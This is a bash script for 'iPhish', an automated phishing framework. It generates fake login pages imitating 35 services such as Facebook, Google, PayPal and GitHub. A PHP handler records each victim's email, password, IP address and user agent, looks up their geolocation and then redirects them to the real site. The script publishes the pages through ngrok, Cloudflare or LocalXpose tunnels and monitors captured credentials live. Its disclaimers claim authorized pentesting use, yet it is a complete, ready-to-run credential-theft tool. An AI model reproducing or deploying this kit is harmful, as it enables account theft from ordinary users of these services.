#!/usr/bin/env bash
#
########################################################################
# ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
# ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║
# ██║██████╔╝███████║██║███████╗███████║
# ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║
# ██║██║     ██║  ██║██║███████║██║  ██║
# ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
#                                                         
#  ██████╗██╗  ██╗██╗███████╗██╗  ██╗                   
# ██╔════╝██║  ██║██║██╔════╝██║  ██║                   
# ██║     ███████║██║███████╗███████║                   
# ██║     ██╔══██║██║╚════██║██╔══██║                   
# ╚██████╗██║  ██║██║███████║██║  ██║                   
#  ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝                   
########################################################################
# Author  : Ry4nCxeven
# Version : 2.0
# Date    : 2026
# Desc    : Automated Phishing Framework (Authorized Pentesting Only)
########################################################################
#
# [DISCLAIMER]
# This tool is created SOLELY for authorized penetration testing,
# educational purposes, and security assessments. 
# The author (Ry4nCxeven) is NOT responsible for any misuse,
# illegal activity, or unauthorized access performed with this tool.
# Users must have explicit written permission from the target owner
# before using this tool. By using this software, you agree to
# use it only in compliance with all applicable laws.
#
# If you do not have explicit authorization, STOP and exit now.
#
########################################################################

# Color codes
GREEN='\033[0;32m'
RED='\033[0;31m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m'
BOLD='\033[1m'

# Banner
banner() {
    clear
    echo -e "${RED}"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo "█                                                                               █"
    echo "█   ██╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗    ██████╗██╗  ██╗██╗███████╗██╗  ██╗█"
    echo "█   ██║██╔══██╗██║  ██║██║██╔════╝██║  ██║   ██╔════╝██║  ██║██║██╔════╝██║  ██║█"
    echo "█   ██║██████╔╝███████║██║███████╗███████║   ██║     ███████║██║███████╗███████║█"
    echo "█   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║   ██║     ██╔══██║██║╚════██║██╔══██║█"
    echo "█   ██║██║     ██║  ██║██║███████║██║  ██║   ╚██████╗██║  ██║██║███████║██║  ██║█"
    echo "█   ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝█"
    echo "█                                                                               █"
    echo "█                      Automated Phishing Framework v2.0                        █"
    echo "█                      Author: Ry4nCxeven                                       █"
    echo "█                      [FOR AUTHORIZED PENTESTING ONLY]                         █"
    echo "█                   I Leave Snakes Behind The Snake Catchers.                   █"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo -e "${NC}"
    echo ""
    echo -e "${YELLOW}[!] DISCLAIMER: Use ONLY on systems you own or have"
    echo -e "    written permission to test. Misuse is illegal and"
    echo -e "    the author (Ry4nCxeven) is NOT responsible.${NC}"
    echo ""
    echo -e "${CYAN}[*] Press ENTER to continue or CTRL+C to exit${NC}"
    read -r
    clear
}

# Check Dependencies
check_deps() {
    echo -e "${CYAN}[*] Checking dependencies...${NC}"
    deps=("php" "curl" "wget" "git" "unzip")
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            echo -e "${RED}[!] $dep is not installed. Installing...${NC}"
            sudo apt install "$dep" -y 2>/dev/null || pkg install "$dep" -y 2>/dev/null
        fi
    done

    # Check Ngrok
    if ! command -v ngrok &>/dev/null; then
        echo -e "${YELLOW}[!] Ngrok not found. Downloading...${NC}"
        wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz -O ngrok.tgz
        tar -xzf ngrok.tgz
        chmod +x ngrok
        sudo mv ngrok /usr/local/bin/
        rm ngrok.tgz
    fi

    # Check Cloudflared
    if ! command -v cloudflared &>/dev/null; then
        echo -e "${YELLOW}[!] Cloudflared not found. Downloading...${NC}"
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        chmod +x cloudflared
        sudo mv cloudflared /usr/local/bin/
    fi

    # Check LocalXpose
    if ! command -v loclx &>/dev/null; then
        echo -e "${YELLOW}[!] LocalXpose not found. Downloading...${NC}"
        wget -q https://localxpose.io/linux/amd64/loclx -O loclx
        chmod +x loclx
        sudo mv loclx /usr/local/bin/
    fi

    echo -e "${GREEN}[+] All dependencies satisfied.${NC}"
    sleep 2
}

# Setup directory structure
setup_dirs() {
    SITES_DIR="$HOME/.iphish_sites"
    mkdir -p "$SITES_DIR"
}

# Create phishing site files (PHP + HTML)
create_site() {
    local site_name="$1"
    local site_dir="$SITES_DIR/$site_name"
    mkdir -p "$site_dir"
    
    # Create login page HTML
    cat > "$site_dir/index.html" << EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>$site_name - Login</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; }
.container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
.logo { font-size: 32px; font-weight: bold; margin-bottom: 20px; }
h2 { margin-bottom: 20px; color: #1c1e21; }
.input-group { margin-bottom: 15px; text-align: left; }
label { display: block; margin-bottom: 5px; color: #606770; font-size: 14px; }
input[type="text"], input[type="email"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
input[type="submit"] { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
input[type="submit"]:hover { background: #166fe5; }
.footer { margin-top: 20px; font-size: 14px; color: #606770; }
</style>
</head>
<body>
<div class="container">
<div class="logo">$site_name</div>
<h2>Log in to continue</h2>
<form method="POST" action="login.php">
<div class="input-group">
<label for="email">Email or Username</label>
<input type="text" id="email" name="email" required>
</div>
<div class="input-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" required>
</div>
<input type="submit" value="Log In">
</form>
<div class="footer">
<p>Secure login • For authorized testing only</p>
</div>
</div>
</body>
</html>
EOF

    # Create PHP handler
    cat > "$site_dir/login.php" << 'PHPEOF'
<?php
$date = date("Y-m-d H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';

$data = "===================================\n";
$data .= "Site: " . basename(dirname(__FILE__)) . "\n";
$data .= "Date: $date\n";
$data .= "IP: $ip\n";
$data .= "User-Agent: $user_agent\n";
$data .= "Email/User: $email\n";
$data .= "Password: $password\n";
$data .= "===================================\n\n";

$logfile = "../captured_credentials.txt";
file_put_contents($logfile, $data, FILE_APPEND | LOCK_EX);

// Collect extra geo info
$geo_data = @file_get_contents("http://ip-api.com/json/$ip");
if ($geo_data) {
    $geo = json_decode($geo_data, true);
    if ($geo && $geo['status'] === 'success') {
        $geo_log = "\n[GEO] ISP: {$geo['isp']} | Country: {$geo['country']} | City: {$geo['city']} | Region: {$geo['regionName']} | Zip: {$geo['zip']} | Lat: {$geo['lat']} | Lon: {$geo['lon']}\n\n";
        file_put_contents("../geo_$ip.txt", $geo_log);
        file_put_contents($logfile, $geo_log, FILE_APPEND | LOCK_EX);
    }
}

// Redirect to real site
$site = basename(dirname(__FILE__));
$real_urls = [
    'Facebook' => 'https://www.facebook.com',
    'Instagram' => 'https://www.instagram.com',
    'Google' => 'https://accounts.google.com',
    'Microsoft' => 'https://login.live.com',
    'Netflix' => 'https://www.netflix.com/login',
    'Paypal' => 'https://www.paypal.com/signin',
    'Steam' => 'https://steamcommunity.com/login',
    'Twitter' => 'https://twitter.com/login',
    'Playstation' => 'https://id.sonyentertainmentnetwork.com',
    'Tiktok' => 'https://www.tiktok.com/login',
    'Twitch' => 'https://www.twitch.tv/login',
    'Pinterest' => 'https://www.pinterest.com/login',
    'Snapchat' => 'https://accounts.snapchat.com',
    'Linkedin' => 'https://www.linkedin.com/login',
    'Ebay' => 'https://signin.ebay.com',
    'Quora' => 'https://www.quora.com/login',
    'Protonmail' => 'https://mail.protonmail.com/login',
    'Spotify' => 'https://accounts.spotify.com',
    'Reddit' => 'https://www.reddit.com/login',
    'Adobe' => 'https://auth.services.adobe.com',
    'DeviantArt' => 'https://www.deviantart.com/users/login',
    'Badoo' => 'https://badoo.com/signin',
    'Origin' => 'https://signin.ea.com',
    'DropBox' => 'https://www.dropbox.com/login',
    'Yahoo' => 'https://login.yahoo.com',
    'Wordpress' => 'https://wordpress.com/log-in',
    'Yandex' => 'https://passport.yandex.com',
    'StackoverFlow' => 'https://stackoverflow.com/users/login',
    'Vk' => 'https://vk.com/login',
    'XBOX' => 'https://login.live.com',
    'Mediafire' => 'https://www.mediafire.com/login',
    'Gitlab' => 'https://gitlab.com/users/sign_in',
    'Github' => 'https://github.com/login',
    'Discord' => 'https://discord.com/login',
    'Roblox' => 'https://www.roblox.com/login'
];

$redirect = $real_urls[$site] ?? 'https://www.google.com';
header("Location: $redirect");
exit();
?>
PHPEOF
}

# Initialize all 35 sites
init_sites() {
    echo -e "${CYAN}[*] Initializing phishing site templates...${NC}"
    
    sites=(
        "Facebook" "Instagram" "Google" "Microsoft" "Netflix"
        "Paypal" "Steam" "Twitter" "Playstation" "Tiktok"
        "Twitch" "Pinterest" "Snapchat" "Linkedin" "Ebay"
        "Quora" "Protonmail" "Spotify" "Reddit" "Adobe"
        "DeviantArt" "Badoo" "Origin" "DropBox" "Yahoo"
        "Wordpress" "Yandex" "StackoverFlow" "Vk" "XBOX"
        "Mediafire" "Gitlab" "Github" "Discord" "Roblox"
    )
    
    for site in "${sites[@]}"; do
        if [ ! -d "$SITES_DIR/$site" ]; then
            create_site "$site"
            echo -e "${GREEN}[+] Created: $site${NC}"
        else
            echo -e "${BLUE}[*] Already exists: $site${NC}"
        fi
    done
    
    echo -e "${GREEN}[+] All 35 sites initialized.${NC}"
    sleep 2
}

# Menu display
show_menu() {
    clear
    echo -e "${RED}"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo "█          iPish by Ry4nCxeven - Automated Phishing Framework v2.0             █"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo -e "${NC}"
    echo -e "${YELLOW}[::] Select An Attack For Your Victim [::]${NC}"
    echo ""
    
    sites=(
        "Facebook" "Instagram" "Google" "Microsoft" "Netflix"
        "Paypal" "Steam" "Twitter" "Playstation" "Tiktok"
        "Twitch" "Pinterest" "Snapchat" "Linkedin" "Ebay"
        "Quora" "Protonmail" "Spotify" "Reddit" "Adobe"
        "DeviantArt" "Badoo" "Origin" "DropBox" "Yahoo"
        "Wordpress" "Yandex" "StackoverFlow" "Vk" "XBOX"
        "Mediafire" "Gitlab" "Github" "Discord" "Roblox"
    )
    
    for i in "${!sites[@]}"; do
        num=$((i + 1))
        if [ $((num % 5)) -eq 1 ]; then
            echo -n -e "${CYAN}"
        elif [ $((num % 5)) -eq 2 ]; then
            echo -n -e "${GREEN}"
        elif [ $((num % 5)) -eq 3 ]; then
            echo -n -e "${YELLOW}"
        elif [ $((num % 5)) -eq 4 ]; then
            echo -n -e "${PURPLE}"
        else
            echo -n -e "${BLUE}"
        fi
        
        printf "[%02d] %-15s" "$num" "${sites[$i]}"
        
        if [ $((num % 5)) -eq 0 ]; then
            echo ""
        fi
    done
    
    echo -e "${NC}"
    echo ""
    echo -e "${RED}[99] Exit${NC}"
    echo ""
    echo -ne "${WHITE}[?] Select a site [1-35]: ${NC}"
    read -r choice
    
    if [ "$choice" = "99" ]; then
        echo -e "${RED}[!] Exiting.${NC}"
        cleanup
        exit 0
    fi
    
    if [ "$choice" -ge 1 ] && [ "$choice" -le 35 ]; then
        selected_site="${sites[$((choice - 1))]}"
        echo -e "${GREEN}[+] Selected: $selected_site${NC}"
        select_tunnel "$selected_site"
    else
        echo -e "${RED}[!] Invalid option!${NC}"
        sleep 2
        show_menu
    fi
}

# Tunnel selection
select_tunnel() {
    local site="$1"
    clear
    echo -e "${RED}"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo "█                      Select Port Forwarding Method                            █"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo -e "${NC}"
    echo -e "${GREEN}[1] Ngrok${NC}"
    echo -e "${CYAN}[2] Cloudflare (Cloudflared)${NC}"
    echo -e "${PURPLE}[3] LocalXpose${NC}"
    echo -e "${YELLOW}[4] Localhost Only (No tunnel)${NC}"
    echo -e "${RED}[5] Back to menu${NC}"
    echo ""
    echo -ne "${WHITE}[?] Select method: ${NC}"
    read -r tun_choice
    
    case "$tun_choice" in
        1) start_ngrok "$site" ;;
        2) start_cloudflare "$site" ;;
        3) start_localxpose "$site" ;;
        4) start_local "$site" ;;
        5) show_menu ;;
        *) echo -e "${RED}[!] Invalid!${NC}"; sleep 2; select_tunnel "$site" ;;
    esac
}

# Start PHP server and tunnel
start_server() {
    local site="$1"
    local port="$2"
    local site_dir="$SITES_DIR/$site"
    
    echo -e "${CYAN}[*] Starting PHP server on port $port...${NC}"
    cd "$SITES_DIR" || exit
    php -S 127.0.0.1:"$port" -t "$site" > /dev/null 2>&1 &
    PHP_PID=$!
    echo -e "${GREEN}[+] PHP server running (PID: $PHP_PID)${NC}"
    sleep 2
}

# Ngrok tunnel
start_ngrok() {
    local site="$1"
    local port=8080
    
    start_server "$site" "$port"
    
    echo -e "${CYAN}[*] Starting Ngrok tunnel...${NC}"
    ngrok http "$port" --log=stdout > /dev/null 2>&1 &
    NGROK_PID=$!
    sleep 4
    
    # Get ngrok URL
    ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | head -1 | cut -d'"' -f4)
    
    show_success "$site" "$ngrok_url" "Ngrok"
}

# Cloudflare tunnel
start_cloudflare() {
    local site="$1"
    local port=8081
    
    start_server "$site" "$port"
    
    echo -e "${CYAN}[*] Starting Cloudflare tunnel...${NC}"
    cloudflared tunnel --url "http://127.0.0.1:$port" > /dev/null 2>&1 &
    CF_PID=$!
    sleep 5
    
    # Get cloudflare URL from logs
    cf_url=$(cloudflared tunnel --url "http://127.0.0.1:$port" 2>&1 | grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' | head -1)
    
    show_success "$site" "$cf_url" "Cloudflare"
}

# LocalXpose tunnel
start_localxpose() {
    local site="$1"
    local port=8082
    
    start_server "$site" "$port"
    
    echo -e "${CYAN}[*] Starting LocalXpose tunnel...${NC}"
    loclx tunnel --http-port "$port" > /dev/null 2>&1 &
    LOCLX_PID=$!
    sleep 4
    
    loclx_url=$(loclx tunnel --http-port "$port" 2>&1 | grep -o 'https://[a-zA-Z0-9.-]*\.loclx\.io' | head -1)
    
    show_success "$site" "$loclx_url" "LocalXpose"
}

# Localhost only
start_local() {
    local site="$1"
    local port=8083
    
    start_server "$site" "$port"
    show_success "$site" "http://127.0.0.1:$port" "Localhost"
}

# Show success message
show_success() {
    local site="$1"
    local url="$2"
    local method="$3"
    
    clear
    echo -e "${RED}"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo "█                          ATTACK READY!                                        █"
    echo "█████████████████████████████████████████████████████████████████████████████████"
    echo -e "${NC}"
    echo -e "${GREEN}[+] Site      : $site${NC}"
    echo -e "${CYAN}[+] Method    : $method${NC}"
    echo -e "${YELLOW}[+] URL       : ${WHITE}$url${NC}"
    echo -e "${GREEN}[+] Status    : ${WHITE}Active - Waiting for credentials...${NC}"
    echo ""
    echo -e "${RED}[!] Send this URL to your target (authorized only)${NC}"
    echo ""
    echo -e "${YELLOW}[*] Captured credentials will be saved to:${NC}"
    echo -e "${WHITE}    $SITES_DIR/captured_credentials.txt${NC}"
    echo ""
    echo -e "${RED}[!] Press CTRL+C to stop the attack${NC}"
    
    # Monitor for credentials in real-time
    echo ""
    echo -e "${CYAN}[*] Monitoring for captured credentials...${NC}"
    echo ""
    
    tail -f "$SITES_DIR/captured_credentials.txt" 2>/dev/null &
    TAIL_PID=$!
    
    wait_for_exit
}

# Wait for exit and cleanup
wait_for_exit() {
    trap 'cleanup; exit 0' INT TERM
    while true; do
        sleep 1
    done
}

# Cleanup
cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    kill "$PHP_PID" 2>/dev/null
    kill "$NGROK_PID" 2>/dev/null
    kill "$CF_PID" 2>/dev/null
    kill "$LOCLX_PID" 2>/dev/null
    kill "$TAIL_PID" 2>/dev/null
    pkill -f "php -S" 2>/dev/null
    echo -e "${GREEN}[+] Cleanup complete.${NC}"
}

# Main execution
main() {
    banner
    
    echo -e "${YELLOW}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║               LEGAL DISCLAIMER - READ CAREFULLY              ║"
    echo "╠══════════════════════════════════════════════════════════════╣"
    echo "║  This tool is for AUTHORIZED PENETRATION TESTING ONLY.      ║"
    echo "║  You MUST have explicit written permission from the owner   ║"
    echo "║  of any system you test with this tool.                     ║"
    echo "║                                                              ║"
    echo "║  By proceeding, you confirm you have such authorization.    ║"
    echo "║  The author (Ry4nCxeven) assumes NO liability for misuse.  ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""
    echo -ne "${WHITE}[?] Type 'AGREE' to accept and continue: ${NC}"
    read -r agreement
    
    if [ "$agreement" != "AGREE" ]; then
        echo -e "${RED}[!] Exiting. You did not accept the terms.${NC}"
        exit 1
    fi
    
    check_deps
    setup_dirs
    init_sites
    show_menu
}

main "$@"
